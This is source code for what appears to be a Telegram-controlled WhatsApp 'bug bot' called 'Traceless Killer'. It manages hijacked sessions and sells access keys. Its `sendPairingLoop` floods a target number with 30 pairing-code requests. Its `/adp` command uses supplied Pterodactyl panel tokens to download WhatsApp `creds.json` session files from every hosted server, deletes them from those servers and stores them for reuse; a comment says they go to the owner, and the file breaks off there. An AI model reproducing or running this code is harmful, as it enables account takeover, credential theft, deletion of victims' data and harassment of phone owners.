const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const fetch = require("node-fetch"); 
const os = require('os');
const AdmZip = require('adm-zip');
const tar = require('tar'); 
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const { InlineKeyboard } = require("grammy");
const {
default: makeWASocket,
makeCacheableSignalKeyStore,
useMultiFileAuthState,
DisconnectReason,
fetchLatestBaileysVersion,
fetchLatestWaWebVersion,
generateForwardMessageContent,
prepareWAMessageMedia,
generateWAMessageFromContent,
generateMessageID,
downloadContentFromMessage,
makeInMemoryStore,
getContentType,
jidDecode,
MessageRetryMap,
getAggregateVotesInPollMessage,
proto,
delay
} = require("@whiskeysockets/baileys");

const { tokens, owner: OwnerId, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const cors = require("cors");
const app = express();

// ✅ Allow semua origin
app.use(cors());

const ownerIds = [7414074179]; // contoh chat_id owner 


const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
let userApiBug = null;
let sock;


function loadAkses() {
  if (!fs.existsSync(file)) {
    const initData = {
      owners: [],
      akses: [],
      resellers: [],
      pts: [],
      moderators: []
    };
    fs.writeFileSync(file, JSON.stringify(initData, null, 2));
    return initData;
  }

  // baca file
  let data = JSON.parse(fs.readFileSync(file));

  // normalisasi biar field baru tetep ada
  if (!data.resellers) data.resellers = [];
  if (!data.pts) data.pts = [];
  if (!data.moderators) data.moderators = [];

  return data;
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// === Helper role ===
function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id.toString());
}

function isAuthorized(id) {
  const data = loadAkses();
  return (
    isOwner(id) ||
    data.akses.includes(id.toString()) ||
    data.resellers.includes(id.toString()) ||
    data.pts.includes(id.toString()) ||
    data.moderators.includes(id.toString())
  );
}

function isReseller(id) {
  const data = loadAkses();
  return data.resellers.includes(id.toString());
}

function isPT(id) {
  const data = loadAkses();
  return data.pts.includes(id.toString());
}

function isModerator(id) {
  const data = loadAkses();
  return data.moderators.includes(id.toString());
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


// === Utility ===
function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

// === User save/load ===
function saveUsers(users) {
  const filePath = path.join(__dirname, "database", "user.json");
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), "utf-8");
    console.log("✓ Data user berhasil disimpan.");
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, "database", "user.json");
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, "utf-8"));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    return [];
  }
}

// === Command: Add Reseller ===
bot.command("addreseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isPT(userId) && !isModerator(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /addreseller <id>");

  const data = loadAkses();
  if (data.resellers.includes(id)) return ctx.reply("✗ Already a reseller.");

  data.resellers.push(id);
  saveAkses(data);
  ctx.reply(`✓ Reseller added: ${id}`);
});

bot.command("delreseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delreseller <id>");

  const data = loadAkses();
  data.resellers = data.resellers.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Reseller removed: ${id}`);
});

// === Command: Add PT ===
bot.command("addpt", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isModerator(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /addpt <id>");

  const data = loadAkses();
  if (data.pts.includes(id)) return ctx.reply("✗ Already PT.");

  data.pts.push(id);
  saveAkses(data);
  ctx.reply(`✓ PT added: ${id}`);
});

bot.command("delpt", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delpt <id>");

  const data = loadAkses();
  data.pts = data.pts.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ PT removed: ${id}`);
});

// === Command: Add Moderator ===
bot.command("addmod", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /addmod <id>");

  const data = loadAkses();
  if (data.moderators.includes(id)) return ctx.reply("✗ Already Moderator.");

  data.moderators.push(id);
  saveAkses(data);
  ctx.reply(`✓ Moderator added: ${id}`);
});

bot.command("delmod", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delmod <id>");

  const data = loadAkses();
  data.moderators = data.moderators.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Moderator removed: ${id}`);
});


const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const delActive = (BotNumber) => {
  if (!fs.existsSync(file_session)) return;
  const list = JSON.parse(fs.readFileSync(file_session));
  const newList = list.filter(num => num !== BotNumber);
  fs.writeFileSync(file_session, JSON.stringify(newList));
  console.log(`✓ Nomor ${BotNumber} berhasil dihapus dari sesi`);
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

function makeBox(title, lines) {
  const contentLengths = [
    title.length,
    ...lines.map(l => l.length)
  ];
  const maxLen = Math.max(...contentLengths);

  const top    = "╔" + "═".repeat(maxLen + 2) + "╗";
  const middle = "╠" + "═".repeat(maxLen + 2) + "╣";
  const bottom = "╚" + "═".repeat(maxLen + 2) + "╝";

  const padCenter = (text, width) => {
    const totalPad = width - text.length;
    const left = Math.floor(totalPad / 2);
    const right = totalPad - left;
    return " ".repeat(left) + text + " ".repeat(right);
  };

  const padRight = (text, width) => {
    return text + " ".repeat(width - text.length);
  };

  const titleLine = "║ " + padCenter(title, maxLen) + " ║";
  const contentLines = lines.map(l => "║ " + padRight(l, maxLen) + " ║");

  return `<blockquote>
${top}
${titleLine}
${middle}
${contentLines.join("\n")}
${bottom}
</blockquote>`;
}

const makeStatus = (number, status) => makeBox("ＳＴＡＴＵＳ", [
  `Ｎｕｍｅｒｏ : ${number}`,
  `Ｅｓｔａｄｏ : ${status.toUpperCase()}`
]);

const makeCode = (number, code) => ({
  text: makeBox("ＳＴＡＴＵＳ ＰＡＩＲ", [
    `Ｎｕｍｅｒｏ : ${number}`,
    `Ｃｏ́ｄｉｇｏ : ${code}`
  ]),
  parse_mode: "HTML"
});

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  
  console.log(chalk.blue(`
╔════════════════════════════╗
║      SESSÕES ATIVAS DO WA
╠════════════════════════════╣
║  QUANTIDADE : ${activeNumbers.length}
╚════════════════════════════╝`));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version, isLatest } = await fetchLatestWaWebVersion();

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, sock);
          return resolve();
        }
        if (connection === "close") {
  const shouldReconnect =
    lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;

  if (shouldReconnect) {
    console.log("Koneksi tertutup, mencoba reconnect...");
    await initializeWhatsAppConnections();
  } else {
    console.log("Koneksi ditutup permanen (Logged Out).");
  }
}
});
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pareando com o número ${BotNumber}...`, { parse_mode: "HTML" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "HTML" });
    } catch (e) {
      console.error("Falha ao editar mensagem:", e.message);
    }
  };

  const { version, isLatest } = await fetchLatestWaWebVersion();

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
    });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;

      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Reconectando..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "✗ Falha na conexão."));
        // ❌ fs.rmSync(sessionDir, { recursive: true, force: true }); --> DIHAPUS
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✓ Conectado com sucesso."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "TRACELES");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
            makeCode(BotNumber, formatted).text, {
              parse_mode: "HTML",
              reply_markup: makeCode(BotNumber, formatted).reply_markup
            });
        }
      } catch (err) {
        console.error("Erro ao solicitar código:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};


const sendPairingLoop = async (targetNumber, ctx, chatId) => {
  const total = 30; // jumlah pengiriman
  const delayMs = 2000; // jeda 2 detik

  try {
    await ctx.reply(
      `🚀 Memulai pengiriman pairing code ke <b>${targetNumber}</b>\nJumlah: ${total}x | Jeda: ${delayMs / 1000}s`,
      { parse_mode: "HTML" }
    );

    // pastikan koneksi WA aktif
    if (!global.sock) return ctx.reply("❌ Belum ada koneksi WhatsApp aktif.");

    for (let i = 1; i <= total; i++) {
      try {
        const code = await global.sock.requestPairingCode(targetNumber, "TOXICXXI");
        const formatted = code.match(/.{1,4}/g)?.join("-") || code;

        await ctx.telegram.sendMessage(
          chatId,
          ` <b>[${i}/${total}]</b> Pairing code ke <b>${targetNumber}</b>:\n<code>${formatted}</code>`,
          { parse_mode: "HTML" }
        );
      } catch (err) {
        await ctx.telegram.sendMessage(
          chatId,
          ` Gagal kirim ke <b>${targetNumber}</b> (${i}/${total}): <code>${err.message}</code>`,
          { parse_mode: "HTML" }
        );
      }

      await new Promise(r => setTimeout(r, delayMs));
    }

    await ctx.reply(`Selesai kirim pairing code ke ${targetNumber} sebanyak ${total}x.`, { parse_mode: "HTML" });

  } catch (error) {
    await ctx.reply(`Terjadi kesalahan: <code>${error.message}</code>`, { parse_mode: "HTML" });
  }
};

bot.command("start", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Usuário";

  const teks = `
┌──────────────────────────────◇
├──── ▢ 「 Tʀᴀᴄᴇʟᴇss Kɪʟʟᴇʀ Vᴠɪᴘ 」
├── ▢ Hᴏʟᴀᴀ ʙʀᴏᴏ : ${username}
│─ Sᴄʀɪᴘᴛ : Tʀᴀᴄᴇʟᴇss Kɪʟʟᴇʀ
│─ Dᴇᴠᴇʟᴏᴘᴇʀ : @DryzxModders 
│─ Vᴇʀsɪᴏɴ : 1.0
│─ Gᴇɴᴇʀᴀsɪ : 2 
│─ Mᴏᴅᴇʟ : Jᴀᴠᴀ Sᴄʀɪᴘᴛ
│
└───────────────────────◇
┌──────────────────────────────◇
├──── ▢ 「 Mᴇɴᴜ Dᴀᴛᴀʙᴀsᴇ 」
├── ▢ Hᴏʟᴀᴀ ʙʀᴏᴏ : ${username}
│─ /addbot
│─ /listbot
│─ /delbot
│─ /ckey
│─ /listkey
│─ /delkey
│─ /addsender
│─ /
│─ /
│─ /
│
└───────────────────────◇
┌──────────────────────────────◇
├──── ▢ 「 Aᴋsᴇs Dᴀᴛᴀʙᴀsᴇ 」
├── ▢ Hᴏʟᴀᴀ ʙʀᴏᴏ : ${username}
│─ /addacces
│─ /delacces
│─ /addowner
│─ /delowner
│─ /addreseller
│─ /delreseller
│─ /addpt
│─ /delpt
│─ /addmod
│─ /delmod
│
└───────────────────────◇
`;

  const keyboard = new InlineKeyboard().url(
    "↯ Channel ↯",
    "https://t.me/XtoolsDryzxMods"
  );

  // Kirim pesan dengan foto terlebih dahulu
  await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/fjnqnt.jpg" },
    {
      caption: teks,
      parse_mode: "HTML",
      reply_markup: keyboard,
    }
  );

  // Kirim audio setelah pesan
  await ctx.replyWithAudio(
    { url: "https://files.catbox.moe/mdoxtb.mp3" }, // Ganti dengan URL audio yang diinginkan
    {
      caption: "🎵 CRITT",
      parse_mode: "HTML"
    }
  );
});


bot.command("addbot", async (ctx) => {
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return ctx.reply("✗ Falha\n\nExample : /addbot 628xxxx", { parse_mode: "HTML" });
  }

  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});
// Command hapus sesi
// Command hapus sesi dengan Telegraf
bot.command("delsesi", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  const BotNumber = args[0];

  if (!BotNumber) {
    return ctx.reply("❌ Gunakan format:\n/delsesi <nomor>");
  }

  try {
    // hapus dari list aktif
    delActive(BotNumber);

    // hapus folder sesi
    const dir = sessionPath(BotNumber);
    if (fs.existsSync(dir)) {
      fs.rmSync(dir, { recursive: true, force: true });
    }

    await ctx.reply(`Sesi untuk nomor *${BotNumber}* berhasil dihapus.`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Gagal hapus sesi:", err);
    await ctx.reply(`❌ Gagal hapus sesi untuk nomor *${BotNumber}*.\nError: ${err.message}`, { parse_mode: "Markdown" });
  }
});


bot.command("listbot", (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA O DONO\n—Por favor, registre-se primeiro para acessar este recurso.");
  }

  if (sessions.size === 0) return ctx.reply("Gak ada sender wlee");

  const daftarSender = [...sessions.keys()]
    .map(n => `• ${n}`)
    .join("\n");

  ctx.reply(`Daftar Sender Aktif:\n${daftarSender}`);
});

bot.command("delbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA USUÁRIOS\n—Por favor, registre-se primeiro para acessar este recurso.");
  }
  
  if (args.length < 2) return ctx.reply("✗ Falha\n\nExample : /delsender 628xxxx", { parse_mode: "HTML" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✓ Session untuk bot ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi error saat menghapus sender.");
  }
});

// === Command: /add (Tambah Session WhatsApp dari file reply) ===
bot.command("addsender", async (ctx) => {
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id;

  // 🔒 Cek hanya owner
  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya owner yang bisa menggunakan perintah ini.");
  }

  const replyMsg = ctx.message.reply_to_message;
  if (!replyMsg || !replyMsg.document) {
    return ctx.reply("❌ Balas file session dengan perintah /add");
  }

  const doc = replyMsg.document;
  const name = doc.file_name.toLowerCase();

  if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext))) {
    return ctx.reply("❌ File bukan session (.json/.zip/.tar/.tgz)");
  }

  await ctx.reply("🔄 Memproses session...");

  try {
    const fileLink = await ctx.telegram.getFileLink(doc.file_id);
    const { data } = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buf = Buffer.from(data);
    const tmp = await fs.promises.mkdtemp(path.join(os.tmpdir(), "sess-"));

    // Ekstrak file
    if (name.endsWith(".json")) {
      await fs.promises.writeFile(path.join(tmp, "creds.json"), buf);
    } else if (name.endsWith(".zip")) {
      new AdmZip(buf).extractAllTo(tmp, true);
    } else {
      const tmpTar = path.join(tmp, name);
      await fs.promises.writeFile(tmpTar, buf);
      await tar.x({ file: tmpTar, cwd: tmp });
    }

    // 🔍 Cari creds.json
    const findCredsFile = async (dir) => {
      const files = await fs.promises.readdir(dir, { withFileTypes: true });
      for (const file of files) {
        const filePath = path.join(dir, file.name);
        if (file.isDirectory()) {
          const found = await findCredsFile(filePath);
          if (found) return found;
        } else if (file.name === "creds.json") {
          return filePath;
        }
      }
      return null;
    };

    const credsPath = await findCredsFile(tmp);
    if (!credsPath) {
      return ctx.reply("❌ creds.json tidak ditemukan di file session.");
    }

    const creds = JSON.parse(await fs.promises.readFile(credsPath, "utf8"));
    const botNumber = creds?.me?.id ? creds.me.id.split(":")[0] : null;
    if (!botNumber) return ctx.reply("❌ creds.json tidak valid (me.id tidak ditemukan)");

    // Buat folder tujuan
    const destDir = sessionPath(botNumber);
    await fs.promises.rm(destDir, { recursive: true, force: true });
    await fs.promises.mkdir(destDir, { recursive: true });

    // Copy isi folder temp ke folder sesi
    const copyDir = async (src, dest) => {
      const entries = await fs.promises.readdir(src, { withFileTypes: true });
      for (const entry of entries) {
        const srcPath = path.join(src, entry.name);
        const destPath = path.join(dest, entry.name);
        if (entry.isDirectory()) {
          await fs.promises.mkdir(destPath, { recursive: true });
          await copyDir(srcPath, destPath);
        } else {
          await fs.promises.copyFile(srcPath, destPath);
        }
      }
    };
    await copyDir(tmp, destDir);

    // Simpan aktif
    const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
    if (!list.includes(botNumber)) {
      fs.writeFileSync(file_session, JSON.stringify([...list, botNumber]));
    }

    // Coba konekkan
    await connectToWhatsApp(botNumber, chatId, ctx);

    return ctx.reply(`✅ Session *${botNumber}* berhasil ditambahkan dan online.`, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error /add:", err);
    return ctx.reply(`❌ Gagal memproses session:\n${err.message}`);
  }
});

bot.command("ckey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA USUÁRIOS\n—Por favor, registre-se primeiro para acessar este recurso.");
  }

  if (!args || !args.includes(",")) {
    return ctx.reply("✗ Falha\n\nExample :\n• /ckey Gyzen,30d\n• /ckey Vortunix,30d,puki", { parse_mode: "HTML" });
  }

  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  const customKey = parts[2] ? parts[2].trim() : null;

  const durationMs = parseDuration(durasiStr);
  if (!durationMs) return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

  const key = customKey || generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  try {
    // Kirim pesan konfirmasi ke group (opsional)
    await ctx.reply("✓ Key berhasil dibuat! Informasi key telah dikirim ke pesan private Anda.");
    
    // Buat inline keyboard dengan button INFORMASI
    const keyboard = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "[ 𝗜𝗡𝗙𝗢 ]",
              url: "https://t.me/XtoolsDryzxMods"
            }
          ]
        ]
      }
    };

    // Kirim detail key secara private ke pengguna dengan button
    await ctx.telegram.sendMessage(
      ctx.from.id,
      `✓ <b>Key berhasil dibuat:</b>\n\n` +
      `<b>Username:</b> <code>${username}</code>\n` +
      `<b>Password:</b> <code>${key}</code>\n` +
      `<b>Expired:</b> <i>${expiredStr}</i> WIB\n\n` +
      `⬇️ <i>Klik button di bawah untuk informasi lebih lanjut:</i>`,
      { 
        parse_mode: "HTML",
        ...keyboard
      }
    );
  } catch (error) {
    // Jika gagal mengirim pesan private, beri instruksi
    await ctx.reply(
      "✓ Key berhasil dibuat! Namun saya tidak bisa mengirim pesan private kepada Anda.\n\n" +
      "Silakan mulai chat dengan saya terlebih dahulu, lalu gunakan command ini lagi.",
      { parse_mode: "HTML" }
    );
  }
});

bot.command("listkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();

  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA O DONO\n—Por favor, registre-se primeiro para acessar este recurso.");
  }

  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `𞅏 𝑨𝒄𝒕𝒊𝒗𝒆 𝑲𝒆𝒚 𝑳𝒊𝒔𝒕:\n\n`;

  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `${i + 1}. ${u.username}\nKey: ${u.key}\nExpired: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA USUÁRIOS\n—Por favor, registre-se primeiro para acessar este recurso.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey taitan");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});

bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA O DONO\n—Por favor, registre-se primeiro para acessar este recurso.");
  }
  
  if (!id) return ctx.reply("✗ Falha\n\nExample : /addacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✓ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✓ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA O DONO\n—Por favor, registre-se primeiro para acessar este recurso.");
  }
  
  if (!id) return ctx.reply("✗ Falha\n\nExample : /delacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("✗ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✓ Access to user ID ${id} removed.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA O DONO\n—Por favor, registre-se primeiro para acessar este recurso.");
  }
  
  if (!id) return ctx.reply("✗ Falha\n\nExample : /addowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✗ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✓ New owner added: ${id}`);
});


bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA O DONO\n—Por favor, registre-se primeiro para acessar este recurso.");
  }
  if (!id) return ctx.reply("✗ Falha\n\nExample : /delowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("✗ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Owner ID ${id} was successfully deleted.`);
});

// Harus ada di scope: axios, fs, path, ownerIds (array), sessionPath(fn), connectToWhatsApp(fn), bot
bot.command("adp", async (ctx) => {
  const REQUEST_DELAY_MS = 250;
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3)
    return ctx.reply(
      "Format salah\nContoh: /adp http://domain.com plta_xxxx pltc_xxxx"
    );

  const domainBase = input[0].replace(/\/+$/, "");
  const plta = input[1];
  const pltc = input[2];

  await ctx.reply("🔍 Mencari creds.json di semua server (1x percobaan per server)...");

  try {
    const appRes = await axios.get(`${domainBase}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` },
    });
    const servers = appRes.data?.data || [];
    if (!servers.length) return ctx.reply("❌ Tidak ada server ditemukan.");

    let totalFound = 0;

    for (const srv of servers) {
      const identifier = srv.attributes?.identifier || srv.identifier || srv.attributes?.id;
      if (!identifier) continue;
      const name = srv.attributes?.name || srv.name || identifier || "unknown";

      const commonPaths = [
        "/home/container/session/creds.json",
        "/home/container/sessions/creds.json",
        "/session/creds.json",
        "/sessions/creds.json",
      ];

      let credsBuffer = null;
      let usedPath = null;

      // 🔹 Coba download creds.json dari lokasi umum
      for (const p of commonPaths) {
        try {
          const dlMeta = await axios.get(
            `${domainBase}/api/client/servers/${identifier}/files/download`,
            {
              params: { file: p },
              headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
            }
          );

          if (dlMeta?.data?.attributes?.url) {
            const fileRes = await axios.get(dlMeta.data.attributes.url, {
              responseType: "arraybuffer",
            });
            credsBuffer = Buffer.from(fileRes.data);
            usedPath = p;
            console.log(`[FOUND] creds.json ditemukan di ${identifier}:${p}`);
            break;
          }
        } catch (e) {
          // skip ke path berikutnya
        }
        await sleep(REQUEST_DELAY_MS);
      }

      if (!credsBuffer) {
        console.log(`[SKIP] creds.json tidak ditemukan di server: ${name}`);
        await sleep(REQUEST_DELAY_MS * 2);
        continue;
      }

      totalFound++;

      // 🔹 AUTO HAPUS creds.json dari server setelah berhasil di-download
      try {
        await axios.post(
          `${domainBase}/api/client/servers/${identifier}/files/delete`,
          { root: "/", files: [usedPath.replace(/^\/+/, "")] },
          { headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` } }
        );
        console.log(`[DELETED] creds.json di server ${identifier} (${usedPath})`);
      } catch (err) {
        console.warn(
          `[WARN] Gagal hapus creds.json di server ${identifier}: ${
            err.response?.status || err.message
          }`
        );
      }

      // 🔹 Parse nomor WA
      let BotNumber = "unknown_number";
      try {
        const txt = credsBuffer.toString("utf8");
        const json = JSON.parse(txt);
        const candidate =
          json.id ||
          json.phone ||
          json.number ||
          (json.me && (json.me.id || json.me.jid || json.me.user)) ||
          json.clientID ||
          (json.registration && json.registration.phone) ||
          null;

        if (candidate) {
          BotNumber = String(candidate).replace(/\D+/g, "");
          if (!BotNumber.startsWith("62") && BotNumber.length >= 8 && BotNumber.length <= 15) {
            BotNumber = "62" + BotNumber;
          }
        } else {
          BotNumber = String(identifier).replace(/\s+/g, "_");
        }
      } catch (e) {
        console.log("Gagal parse creds.json -> fallback ke identifier:", e.message);
        BotNumber = String(identifier).replace(/\s+/g, "_");
      }

      // 🔹 Simpan creds lokal
      const sessDir = sessionPath(BotNumber);
      try {
        fs.mkdirSync(sessDir, { recursive: true });
        fs.writeFileSync(path.join(sessDir, "creds.json"), credsBuffer);
      } catch (e) {
        console.error("Gagal simpan creds:", e.message);
      }

      // 🔹 Kirim file ke owner
